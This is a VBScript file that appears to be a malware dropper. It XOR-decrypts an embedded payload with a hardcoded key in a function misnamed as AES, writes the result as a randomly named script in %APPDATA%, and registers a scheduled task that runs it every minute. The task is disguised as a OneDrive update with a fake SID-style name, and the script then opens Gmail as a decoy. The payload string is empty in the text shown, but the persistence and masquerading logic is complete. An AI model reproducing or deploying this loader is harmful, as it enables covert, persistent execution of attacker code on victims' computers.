Option Explicit
Function StringToBytes(str)
    Dim bytes(), i
    ReDim bytes(Len(str) - 1)
    For i = 1 To Len(str)
        bytes(i - 1) = Asc(Mid(str, i, 1))
    Next
    StringToBytes = bytes
End Function
Function BytesToString(bytes)
    Dim i, str
    str = ""
    For i = 0 To UBound(bytes)
        str = str & Chr(bytes(i))
    Next
    BytesToString = str
End Function
Function DeriveKey(password)
    Dim key(15), i
    For i = 0 To 15
        If i < Len(password) Then
            key(i) = Asc(Mid(password, i + 1, 1))
        Else
            key(i) = 0
        End If
    Next
    DeriveKey = key
End Function
Function AESDecrypt(cipherHex, password)
    Dim key, bytes, i
    key = DeriveKey(password)
    bytes = HexToBytes(cipherHex)
    For i = 0 To UBound(bytes)
        bytes(i) = (bytes(i) Xor key(i Mod 16)) And 255
    Next
    AESDecrypt = BytesToString(bytes)
End Function
Function BytesToHex(bytes)
    Dim hexStr, i
    hexStr = ""
    For i = 0 To UBound(bytes)
        hexStr = hexStr & Right("0" & Hex(bytes(i)), 2)
    Next
    BytesToHex = hexStr
End Function
Function HexToBytes(hexStr)
    Dim i, bytes()
    ReDim bytes((Len(hexStr) \ 2) - 1)
    For i = 0 To UBound(bytes)
        bytes(i) = CInt("&H" & Mid(hexStr, i * 2 + 1, 2))
    Next
    HexToBytes = bytes
End Function
Dim cipherText, decryptedText, password, letters, word, i, rndIndex, sh, fso, file, psFile, service,rootFolder, taskDef, trigger, action
cipherText = ""
password = "MySecurePasswordisomski"
letters = "abcdefghijklmnopqrstuvwxyz"
decryptedText = AESDecrypt(cipherText, password)
Randomize
word = ""
For i = 1 To 7
    rndIndex = Int(Rnd * Len(letters)) + 1
    word = word & Mid(letters, rndIndex, 1)
Next
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
psFile = sh.ExpandEnvironmentStrings("%APPDATA%") & "\" & word & ".vbs"
Set file = fso.CreateTextFile(psFile, True)
file.WriteLine decryptedText
file.Close
Set service = CreateObject("Schedule.Service")
service.Connect
Set rootFolder = service.GetFolder("\")  
Set taskDef = service.NewTask(0)
taskDef.RegistrationInfo.Description = "OneDrive Standalone Update Task-S-1-5-21-1187179157-150580998-3348809432-999"
taskDef.RegistrationInfo.Author = "User"
taskDef.Settings.Enabled = True
taskDef.Settings.StartWhenAvailable = True
Set trigger = taskDef.Triggers.Create(1)
trigger.StartBoundary = "2026-04-10T00:00:00"
trigger.Repetition.Interval = "PT1M"
Set action = taskDef.Actions.Create(0)
action.Path = psFile
rootFolder.RegisterTaskDefinition "OneDrive Standalone Update Task-S-1-5-21-1187179157-150580998-3348809432-999", taskDef, 6, , , 3
sh.Run "https://mail.google.com/"
